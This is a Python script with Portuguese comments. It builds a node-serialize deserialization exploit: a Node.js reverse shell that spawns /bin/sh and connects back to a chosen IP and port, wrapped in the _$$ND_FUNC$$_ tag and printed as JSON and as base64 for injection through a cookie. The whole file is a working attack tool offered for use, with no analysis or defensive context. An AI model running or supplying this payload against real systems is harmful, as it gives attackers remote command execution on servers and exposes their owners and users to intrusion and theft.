#!/usr/bin/env python3
import os
import base64
import json
import sys

def clean():
    try:
      os.system("clear")
    except:
      os.system("cls")
    finally:
      pass

def gerar_payload(ip, porta):
    shell_payload = f"""
function(){{
    var net = require('net'), 
        cp = require('child_process'), 
        sh = cp.spawn('/bin/sh', []);
    var client = new net.Socket();
    client.connect({porta}, '{ip}', function() {{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}}()
""".strip()

    # Adiciona a tag especial do node-serialize
    payload_obj = {
        "email": "_$$ND_FUNC$$_" + shell_payload.replace('\n', '').replace('  ', '')
    }

    payload_json = json.dumps(payload_obj)
    payload_base64 = base64.b64encode(payload_json.encode()).decode()

    return payload_json, payload_base64


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Uso: {sys.argv[0]} <LHOST> <LPORT>")
        sys.exit(1)
    clean()
    ip = sys.argv[1]
    porta = sys.argv[2]

    json_payload, base64_payload = gerar_payload(ip, porta)

    print("[+] Payload JSON:\n")
    print(json_payload)
    print("\n[+] Payload json para Base64 (para uso em cookie):\n")
    print(base64_payload)
